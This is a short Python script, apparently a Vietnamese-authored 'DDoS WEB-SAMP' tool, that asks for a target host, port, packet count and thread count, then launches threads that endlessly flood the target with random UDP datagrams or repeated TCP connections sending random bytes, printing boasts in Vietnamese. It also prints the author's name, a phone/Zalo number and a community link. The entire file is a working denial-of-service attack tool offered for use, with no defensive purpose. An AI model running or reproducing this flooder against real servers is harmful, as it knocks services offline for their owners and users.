#!/usr/bin/env python3
import random
import socket
import threading

print       (" TOOL DDOS WEB-SAMP BY TGOD THANH TÙNG VIPPRO ")  


print       (" >> TOOLS CREATED BY TGod - Thanh Tùng <<")
print       (" >> Zalo : 0328327663 << ")
print       (">> DON'T ABUSE MY TOOLS <<")                                   
print       (" >> SEE ME IF YOU NEED HELP <<")
print       (" >> JOIN OUR COMMUNITY AND LEARN TOGETHER<<")
print       (" >> https://zalo.me/g/tlolln257 <<")
    
ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Mau Gass?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1000)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" TGodThanhTùng ĐÃ SÚT VÀO MÕM SEVER NÀY ")
		except:
			print("[!] SERVER CONNECTION TIMEOUT ERROR ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" TGodThanhTùng ĐÃ SÚT VÀO MÕM SEVER NÀY ")
		except:
			s.close()
			print("[*] SERVER CONNECTION TIMEOUT ERROR")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
